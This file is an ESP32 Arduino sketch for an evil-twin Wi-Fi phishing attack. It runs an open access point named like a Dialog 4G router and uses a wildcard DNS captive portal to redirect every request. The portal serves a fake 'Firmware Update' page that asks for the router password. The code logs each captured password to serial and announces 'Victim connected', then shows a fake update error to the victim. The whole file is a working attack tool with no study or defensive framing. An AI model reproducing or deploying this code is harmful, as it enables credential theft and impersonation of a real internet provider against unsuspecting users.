#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

const char* ssid = "Dialog 4G 670";
const char* html = R"rawliteral(
<!DOCTYPE html>
<html lang='en'>
<head>
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Dialog 4G</title>
    <style>
* {margin: 0;padding: 0;box-sizing: border-box;}

body {
    font-family: Arial, sans-serif;
    background: white;
    min-height: 100vh;
    display: flex;flex-direction: column;align-items: center;color: #333;
}
.bbox{
    width: 970px;
    height: 500px;
    display: flex;
    justify-content: center;
    align-items: center;
    margin: auto;
    background: linear-gradient(to bottom, blue, white);
}

header {
  
    width: 100%;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 20px;
    background: transparent;
}

.logo img {
    height: auto; 
    width: auto;
}

.status-bar {
    display: flex;
    align-items: center;
    gap: 10px;
    color: #fff;
    font-size: 12px;
}

.status-bar span {
    cursor: pointer;
}

.status-bar span:last-child {
    text-decoration: underline;
}
main {
    flex: 1;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
}

.login-box {
    background: #fff;
    padding: 30px;
    border-radius: 10px;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
    width: 100%;
    max-width: 300px;
    text-align: left;
}

.input-group {
    margin-bottom: 20px;
}

.input-group label {
    display: block;
    font-size: 14px;
    margin-bottom: 5px;
    color: #333;
}

.input-group input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 5px;
    font-size: 14px;
}

.input-group input:focus {
    outline: none;
    border-color: #007bff;
}

button {
    width: 100%;
    padding: 12px;
    background-color: #007bff;
    border: none;
    border-radius: 5px;
    color: #fff;
    font-size: 16px;
    cursor: pointer;
    transition: background-color 0.3s;
}

button:hover {
    background-color: #0056b3;
}

@keyframes loading {
    0% { width: 0%;
    }
    100% { width: 100%; }
}
    </style>
</head>
<body>
    <header>
        <div class='logo'>
        <svg width="200" height="60" viewBox="0 0 200 60" >
  <g>
    <polygon points="10,10 30,10 20,0" fill="#FFD700" />
    <polygon points="10,10 20,0 15,20" fill="#FFA500" />
    <polygon points="30,10 20,0 25,20" fill="#FF4500" />
    <polygon points="15,20 25,20 20,30" fill="#C71585" />
  </g>
  <text x="40" y="25" font-family="Arial, sans-serif" font-size="20" fill="#FF0000">Dialog 2025</text>
  <text x="42" y="55" font-family="Arial, sans-serif" font-size="35" font-weight="bold" fill="#FF0000">4G</text>
  
<text x="90" y="45" font-family="Arial, sans-serif" font-size="16" fill="#555">HOME</text>
  <text x="90" y="60" font-family="Arial, sans-serif" font-size="16" fill="#555">Broadband </text>
</svg>
            <br><br><br><br><h1>Firmware Update - 2025</h1>
        </div>
    </header>
    <main>
        <div class='bbox'>
            <div class='login-box'>
                <form id="updateForm">
               
                    <div class='input-group'>
                        <label for='username'>Username</label>
                        <input type='text' id='username' value='Dialog 4G 670' disabled>
                    </div>
                   
                    <div class='input-group'>
                        <label for='password'>Password</label>
                        <input type='password' minlength='8' id='password' name='password' required>
                    </div>
                    <button type='submit'>Update</button>
   
                </form>
            </div>
        </div>
    </main>

    <script>
        document.getElementById('updateForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            const mainContent = document.querySelector('main');
            
            // Show loading animation
            mainContent.innerHTML = `
                <div style='text-align: center;'>
                    <div style='width: 400px;
height: 20px; background: #ccc; border-radius: 10px; overflow: hidden; margin-bottom: 10px;'>
                        <div style='width: 0%;
height: 100%; background: #007bff; animation: loading 20s linear forwards;'></div>
                    </div>
                    <p>Updating...</p>
                    <p><b>Please do not turn off the device.</b></p>
                    <br>
      
                    <p>Your Router will restart several times.</p>
                </div>
            `;
            // Send data to ESP32
            fetch('/update', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
            
                body: 'password=' + encodeURIComponent(password)
            })
            .then(response => response.text())
            .then(html => {
                // After 20 seconds, show error (as in your original)
                setTimeout(() => {
          
                    mainContent.innerHTML = `
                        <div style='text-align: center; color: red;'>
                            <h2>Error ! </h2>
                            <p>An error 
occurred during the update process.</p><br>
                            <p>Please Power Off and Restart your Router manualy</p>
                        </div>
                    `;
                }, 
                40000);
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
)rawliteral";

void handleRoot() {
  server.send(200, "text/html", html);
}

void handleUpdate() {
  if (server.method() != HTTP_POST) {
    server.send(405, "text/plain", "Method Not Allowed");
  } else {
    String password = server.arg("password");
    
    Serial.println("\n----- PASSWORD CAPTURED -----");
    Serial.print("Password: ");
    Serial.println(password);
    Serial.println("-----------------------------\n");
    
    // Just acknowledge receipt - the JS will handle the UI updates
    server.send(200, "text/plain", "OK");
  }
}

void setup() {
  Serial.begin(115200);
  
  // Start WiFi in AP mode
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid);
  
  // Start DNS server to redirect all requests to our IP
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  // Set up web server routes
  server.on("/", handleRoot);
  server.on("/update", handleUpdate);
  server.onNotFound(handleRoot);
  
  server.begin();
  
  Serial.println("###################################################################################");
  Serial.println("");
  Serial.println("");
  Serial.println("DEVIL Started");
  Serial.println("Access Point started");
  Serial.print("SSID: ");
  Serial.println(ssid);
  Serial.print("IP Address: ");
  Serial.println(WiFi.softAPIP());
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

    // ESP8266: Check for station connection/disconnection
    static int numConnectedClients = 0;
    int currentConnectedClients = WiFi.softAPgetStationNum();

    if (currentConnectedClients > numConnectedClients) {
        Serial.println("Victim connected to Devil Brother");
        numConnectedClients = currentConnectedClients;
    } else if (currentConnectedClients < numConnectedClients) {
        Serial.println("Victim disconnected from Devil Brother");
        numConnectedClients = currentConnectedClients;
    }
}
